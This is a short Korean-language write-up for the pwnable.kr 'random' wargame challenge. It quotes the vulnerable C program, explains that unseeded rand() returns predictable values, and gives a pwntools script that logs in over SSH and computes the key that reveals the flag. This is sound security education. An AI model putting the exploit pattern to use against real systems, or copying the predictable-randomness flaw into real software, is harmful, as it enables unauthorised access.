# [pwnable.kr] random

> Daddy, teach me how to use random value in programming!
>
> ssh random@pwnable.kr -p2222 (pw:guest)

## Bug

```c
/* random.c */

#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}
```

`rand()`는 랜덤 값을 반환하긴 하지만, 실행할 때마다 랜덤 값을 생성하는 것이 아니라 미리 정해진 값을 반환하는 식으로 동작한다. 따라서 `srand()`와 `rand()`로 생성하는 랜덤 값은 무조건 재현할 수 있다.

## Exploit

```python
# ex.py

from pwn import *
from ctypes import *

p = ssh("random", "pwnable.kr", 2222, "guest").process("/home/random/random")

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
random = libc.rand()
key = random ^ 0xDEADBEEF
p.sendline(str(key).encode())

p.interactive()
```

![image](https://github.com/user-attachments/assets/1aa9d95c-106f-4968-9987-30abf4961f3b)